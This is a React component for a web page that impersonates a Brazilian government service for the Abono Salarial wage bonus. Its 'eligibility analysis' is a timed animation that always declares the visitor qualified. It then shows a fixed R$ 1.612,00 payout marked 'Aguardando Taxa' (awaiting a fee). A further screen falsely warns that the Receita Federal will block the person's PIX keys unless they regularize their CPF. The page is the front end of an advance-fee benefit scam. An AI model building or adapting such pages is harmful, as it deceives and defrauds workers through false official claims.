import React, { useEffect, useState, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { User, IdCard, Calendar, FileText, ArrowLeft, CheckCircle, AlertTriangle, Search, Clock, LoaderCircle, Award, Briefcase, ClipboardCheck, Building, CreditCard, Calendar as CalendarIcon, Banknote, ChevronDown, ChevronUp } from "lucide-react";
import { toast } from 'sonner';
import PageLayout from '@/components/PageLayout';
import { Progress } from "@/components/ui/progress";
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
import { Separator } from "@/components/ui/separator";
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";

const UserData: React.FC = () => {
  const [userData, setUserData] = useState<any>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [showVerification, setShowVerification] = useState<boolean>(false);
  const [analysisComplete, setAnalysisComplete] = useState<boolean>(false);
  const [analysisSteps, setAnalysisSteps] = useState<{title: string, detail: string, progress: number, completed: boolean}[]>([]);
  const [showQualificationButton, setShowQualificationButton] = useState<boolean>(false);
  const [autoScroll, setAutoScroll] = useState<boolean>(true);
  const [areAllStepsComplete, setAreAllStepsComplete] = useState<boolean>(false);
  const [showAbonoPagamento, setShowAbonoPagamento] = useState<boolean>(false);
  const [isUserInfoOpen, setIsUserInfoOpen] = useState<boolean>(true);
  const [isPaymentInfoOpen, setIsPaymentInfoOpen] = useState<boolean>(false);
  const stepsContainerRef = useRef<HTMLDivElement>(null);
  const navigate = useNavigate();
  const location = useLocation();
  
  useEffect(() => {
    if (location.state && location.state.userData) {
      setUserData(location.state.userData);
    } else {
      toast.error("Nenhum dado encontrado. Por favor, faça a consulta novamente.");
      navigate('/');
    }
  }, [location.state, navigate]);

  const animateProgressBars = () => {
    setAnalysisSteps(steps => 
      steps.map(step => {
        if (step.progress < 100) {
          return { ...step, progress: Math.min(step.progress + 1, 100) };
        } else if (step.progress === 100 && !step.completed) {
          return { ...step, completed: true };
        }
        return step;
      })
    );
  };

  useEffect(() => {
    const intervalId = setInterval(animateProgressBars, 50);
    return () => clearInterval(intervalId);
  }, []);

  useEffect(() => {
    if (analysisSteps.length === 3 && analysisSteps.every(step => step.progress === 100)) {
      setAreAllStepsComplete(true);
      setShowQualificationButton(true);
    }
  }, [analysisSteps]);

  const formatDate = (dateString: string) => {
    if (!dateString) return null;
    const date = new Date(dateString);
    return date.toLocaleDateString('pt-BR');
  };

  const getCurrentDate = () => {
    return new Date().toLocaleDateString('pt-BR');
  };

  const getStepIcon = (step: {title: string, completed: boolean}) => {
    if (step.completed) {
      return <CheckCircle className="h-4 w-4 text-green-600 flex-shrink-0" />;
    }
    
    if (step.title.includes("atividade remunerada")) {
      return <Briefcase className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    } else if (step.title.includes("Dados Informados")) {
      return <ClipboardCheck className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    } else if (step.title.includes("Empregadores")) {
      return <Building className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    } else if (step.title.includes("CPF")) {
      return <Search className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    } else if (step.title.includes("transferências") || step.title.includes("movimentações")) {
      return <Clock className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    } else if (step.title.includes("declarações") || step.title.includes("registros") || step.title.includes("histórico")) {
      return <FileText className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    } else {
      return <LoaderCircle className="h-4 w-4 text-govblue-600 flex-shrink-0" />;
    }
  };

  const handleConfirmData = () => {
    setShowVerification(true);
    setAreAllStepsComplete(false);
    
    const analysisStepsList = [
      {
        title: "Exercer atividade remunerada",
        detail: "Ter exercido atividade remunerada por pelo menos 30 dias",
        progress: 0,
        completed: false
      },
      {
        title: "Dados Informados Corretamente",
        detail: "Ter os dados corretamente informados pelo empregador",
        progress: 0,
        completed: false
      },
      {
        title: "Empregadores Contribuintes",
        detail: "Empregadores contribuem para o PIS ou Pasep",
        progress: 0,
        completed: false
      }
    ];
    
    setLoading(true);
    setAnalysisSteps([]);
    setShowQualificationButton(false);
    
    let currentStep = 0;
    const processStep = () => {
      if (currentStep < analysisStepsList.length) {
        const newStep = analysisStepsList[currentStep];
        setAnalysisSteps(prevSteps => [...prevSteps, newStep]);
        currentStep++;
        setTimeout(processStep, 2500 + Math.random() * 500);
      } else {
        setLoading(false);
        // Remove this line as we'll set it in the useEffect when all steps reach 100%
        // setShowQualificationButton(true);
      }
    };
    
    setTimeout(processStep, 800);
  };

  const handleQualified = () => {
    setShowQualificationButton(false);
    setShowAbonoPagamento(true);
  };

  const handleRegularize = () => {
    toast.info("Funcionalidade de regularização ainda não implementada.");
  };

  const handleGoBack = () => {
    navigate('/');
  };

  const handleBackToVerification = () => {
    setShowAbonoPagamento(false);
    setShowQualificationButton(true);
  };

  const handleConfirmUserData = () => {
    setIsPaymentInfoOpen(true);
  };

  if (!userData) {
    return (
      <PageLayout>
        <div className="flex justify-center items-center">
          <p>Carregando dados...</p>
        </div>
      </PageLayout>
    );
  }

  return (
    <PageLayout>
      <div className="container mx-auto p-0 pb-6 relative">
        <div className="absolute top-0 left-0 mt-2 ml-0">
          <Button
            variant="ghost"
            size="icon"
            onClick={showAbonoPagamento ? handleBackToVerification : handleGoBack}
            className="text-gray-500 hover:text-gray-700 hover:bg-transparent"
          >
            <ArrowLeft className="h-5 w-5" />
          </Button>
        </div>
        
        {!showAbonoPagamento ? (
          <div className="glass-card rounded-xl p-6 animate-fade-in mt-2">
            {!showVerification ? (
              <>
                <h2 className="font-heading text-xl font-semibold text-gray-800 mb-6">
                  Dados do Contribuinte
                </h2>
                
                <div className="space-y-4 mb-8">
                  <div className="flex items-center border-b border-gray-200 py-3">
                    <User className="h-5 w-5 text-govblue-600 mr-3" />
                    <div>
                      <div className="text-sm text-gray-500">Nome Completo</div>
                      <div className="font-medium">{userData.nome}</div>
                    </div>
                  </div>
                  
                  <div className="flex items-center border-b border-gray-200 py-3">
                    <IdCard className="h-5 w-5 text-govblue-600 mr-3" />
                    <div>
                      <div className="text-sm text-gray-500">CPF</div>
                      <div className="font-medium">{userData.cpf}</div>
                    </div>
                  </div>
                  
                  {userData.data_nascimento && (
                    <div className="flex items-center border-b border-gray-200 py-3">
                      <Calendar className="h-5 w-5 text-govblue-600 mr-3" />
                      <div>
                        <div className="text-sm text-gray-500">Data de Nascimento</div>
                        <div className="font-medium">{formatDate(userData.data_nascimento)}</div>
                      </div>
                    </div>
                  )}
                  
                  {userData.nome_mae && (
                    <div className="flex items-center border-b border-gray-200 py-3">
                      <FileText className="h-5 w-5 text-govblue-600 mr-3" />
                      <div>
                        <div className="text-sm text-gray-500">Nome da Mãe</div>
                        <div className="font-medium">{userData.nome_mae}</div>
                      </div>
                    </div>
                  )}
                </div>
                
                <div className="flex justify-center">
                  <Button
                    className="gov-button rounded-full px-4 py-3 text-base w-full max-w-md"
                    onClick={handleConfirmData}
                  >
                    <CheckCircle className="mr-2 h-4 w-4 flex-shrink-0" />
                    <span>Consultar Abono Salarial</span>
                  </Button>
                </div>
              </>
            ) : !analysisComplete ? (
              <div className="py-2 w-full">
                <h3 className="text-govblue-700 font-medium mb-2 text-center">
                  {areAllStepsComplete 
                    ? "Análise Concluída! Você tem direito ao Abono Salarial." 
                    : "Análise em andamento..."}
                </h3>
                
                <div className="w-full mb-6">
                  <div className="space-y-4 w-full">
                    {analysisSteps.map((step, index) => (
                      <div 
                        key={index} 
                        className={`flex flex-col ${step.completed ? 'bg-green-50' : step.progress === 100 ? 'bg-[#F2FCE2]' : 'bg-white'} border border-gray-100 rounded-md py-3 px-4 shadow-sm mb-2 overflow-visible w-full transition-colors duration-300`}
                      >
                        <div className="flex items-start mb-2">
                          <div className={`${step.completed ? 'bg-green-50' : 'bg-gray-50'} p-1.5 rounded-md mr-3 mt-1`}>
                            {getStepIcon(step)}
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className={`font-medium text-sm ${step.completed ? 'text-green-700' : 'text-gray-800'}`}>{step.title}</div>
                            <div className="text-sm text-gray-500 break-words">{step.detail}</div>
                          </div>
                        </div>
                        
                        <div className="ml-8 mr-2 mt-1">
                          <Progress 
                            className="h-1.5 w-full bg-gray-100" 
                            value={step.progress}
                            style={{
                              '--progress-background': step.completed ? '#22C55E' : step.progress === 100 ? '#22C55E' : '#0066CC',
                            } as React.CSSProperties}
                          />
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                
                {loading ? (
                  <div className="flex justify-center mt-4">
                    <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-govblue-600"></div>
                  </div>
                ) : showQualificationButton && areAllStepsComplete && (
                  <div className="flex justify-center mt-6">
                    <Button 
                      className="gov-button bg-govblue-600 hover:bg-govblue-500 rounded-full px-6 py-4 text-base w-full max-w-md"
                      onClick={handleQualified}
                    >
                      <Award className="mr-2 h-5 w-5 flex-shrink-0" />
                      <span className="font-medium">Você está qualificado a receber</span>
                    </Button>
                  </div>
                )}
              </div>
            ) : (
              <>
                <h2 className="font-heading text-xl font-semibold text-red-600 mb-6">
                  Pendências Identificadas
                </h2>
                
                <div className="mb-4">
                  <div className="text-sm font-medium">Nome: {userData.nome}</div>
                  <div className="text-sm font-medium">CPF: {userData.cpf}</div>
                </div>
                
                <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
                  <div className="font-medium text-red-700 mb-2">Pendências identificadas junto à Receita Federal:</div>
                  
                  <div className="mb-3">
                    <strong>Ano 2023</strong>
                    <div className="mt-1 text-sm">
                      • Divergências na declaração de renda<br />
                      • Inconsistências nos valores declarados
                    </div>
                  </div>
                  
                  <div>
                    <strong>Ano 2024</strong>
                    <div className="mt-1 text-sm">
                      • Movimentações financeiras incompatíveis<br />
                      • Transações não declaradas identificadas
                    </div>
                  </div>
                </div>
                
                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6 text-sm">
                  <p className="text-yellow-800">
                    Comunicamos que, devido às irregularidades identificadas, o contribuinte estará na 
                    Lista de Bloqueio da Receita Federal a partir de {
                      new Date(new Date().setDate(new Date().getDate() + 1)).toLocaleDateString('pt-BR')
                    }. 
                    Todas as chaves PIX serão bloqueadas, impossibilitando a realização e recebimento de transferências via PIX.
                  </p>
                </div>
                
                <div className="flex justify-center">
                  <Button 
                    className="bg-red-600 hover:bg-red-700 rounded-full px-4 py-3 text-base w-full max-w-md"
                    onClick={handleRegularize}
                  >
                    <AlertTriangle className="mr-2 h-4 w-4 flex-shrink-0" />
                    <span>Regularizar meu CPF</span>
                  </Button>
                </div>
              </>
            )}
          </div>
        ) : (
          <div className="glass-card rounded-xl p-3 animate-fade-in mt-0">
            <h2 className="font-heading text-xl font-semibold text-govblue-700 mb-1">
              Detalhes do Abono Salarial
            </h2>
            
            <div className="flex flex-col sm:flex-row justify-between mb-3 bg-govblue-50 p-3 rounded-lg">
              <div className="flex items-center mb-2 sm:mb-0">
                <CalendarIcon className="h-5 w-5 text-govblue-600 mr-2" />
                <span className="text-sm font-medium">Ano Base: 2023</span>
              </div>
              <div className="flex items-center">
                <CheckCircle className="h-5 w-5 text-green-600 mr-2" />
                <span className="text-sm font-medium text-green-700">Situação: Válido</span>
              </div>
            </div>
            
            <Collapsible 
              open={isUserInfoOpen} 
              onOpenChange={setIsUserInfoOpen}
              className="mb-3"
            >
              <Card>
                <CardHeader className="pb-1 pt-3">
                  <CollapsibleTrigger className="w-full flex items-center justify-between">
                    <CardTitle className="text-base font-medium flex items-center">
                      <User className="h-5 w-5 text-govblue-600 mr-2" />
                      Informações do Trabalhador
                    </CardTitle>
                    {isUserInfoOpen ? 
                      <ChevronUp className="h-4 w-4 text-gray-500" /> : 
                      <ChevronDown className="h-4 w-4 text-gray-500" />
                    }
                  </CollapsibleTrigger>
                </CardHeader>
                <CollapsibleContent>
                  <CardContent className="py-2">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                      <div className="flex flex-col">
                        <span className="text-xs text-gray-500">Nome Completo</span>
                        <span className="text-sm font-medium">{userData.nome}</span>
                      </div>
                      <div className="flex flex-col">
                        <span className="text-xs text-gray-500">CPF</span>
                        <span className="text-sm font-medium">{userData.cpf}</span>
                      </div>
                      {userData.data_nascimento && (
                        <div className="flex flex-col">
                          <span className="text-xs text-gray-500">Data de Nascimento</span>
                          <span className="text-sm font-medium">{formatDate(userData.data_nascimento)}</span>
                        </div>
                      )}
                    </div>
                    <div className="mt-3 flex justify-center">
                      <Button 
                        onClick={handleConfirmUserData}
                        className="gov-button bg-green-600 hover:bg-green-700 rounded-full px-4 py-2 text-sm w-full max-w-md"
                      >
                        <CheckCircle className="mr-2 h-4 w-4 flex-shrink-0" />
                        <span className="font-medium">Confirmo meus dados</span>
                      </Button>
                    </div>
                  </CardContent>
                </CollapsibleContent>
              </Card>
            </Collapsible>
            
            <Collapsible 
              open={isPaymentInfoOpen} 
              onOpenChange={setIsPaymentInfoOpen}
              className="mb-3"
            >
              <Card>
                <CardHeader className="pb-1 pt-2">
                  <CollapsibleTrigger className="w-full flex items-center justify-between">
                    <CardTitle className="text-base font-medium flex items-center">
                      <CreditCard className="h-5 w-5 text-govblue-600 mr-2" />
                      Informações de Pagamento
                    </CardTitle>
                    {isPaymentInfoOpen ? 
                      <ChevronUp className="h-4 w-4 text-gray-500" /> : 
                      <ChevronDown className="h-4 w-4 text-gray-500" />
                    }
                  </CollapsibleTrigger>
                </CardHeader>
                <CollapsibleContent>
                  <CardContent className="py-2">
                    <div className="space-y-1">
                      <div className="flex flex-col">
                        <span className="text-xs text-gray-500">Valor do Pagamento</span>
                        <span className="text-sm font-medium text-green-700">R$ 1.612,00</span>
                      </div>
                      <Separator className="my-1" />
                      <div className="flex flex-col">
                        <span className="text-xs text-gray-500">Valor proporcional do pagamento</span>
                        <span className="text-sm font-medium text-green-700">2 Salários mínimos</span>
                      </div>
                      <Separator className="my-1" />
                      <div className="flex flex-col">
                        <span className="text-xs text-gray-500">Situação do Pagamento</span>
                        <span className="text-sm font-medium text-amber-600">Aguardando Taxa</span>
                      </div>
                      <Separator className="my-1" />
                      <div className="flex flex-col">
                        <span className="text-xs text-gray-500">Data do Pagamento</span>
                        <span className="text-sm font-medium">{getCurrentDate()}</span>
                      </div>
                      <Separator className="my-1" />
                      <div className="flex flex-col">
                        <span className="text-xs text-gray-500">Agente Pagador</span>
                        <span className="text-sm font-medium">Caixa Econômica</span>
                      </div>
                    </div>
                  </CardContent>
                </CollapsibleContent>
              </Card>
            </Collapsible>
            
            <div className="mt-4 flex justify-center">
              <Button 
                className="gov-button bg-govblue-600 hover:bg-govblue-500 rounded-full px-6 py-4 text-base w-full max-w-md"
                onClick={() => toast.success("Processando sua solicitação de recebimento.")}
              >
                <Banknote className="mr-2 h-5 w-5 flex-shrink-0" />
                <span className="font-medium">Receber Abono Salarial</span>
              </Button>
            </div>
          </div>
        )}
      </div>
    </PageLayout>
  );
};

export default UserData;
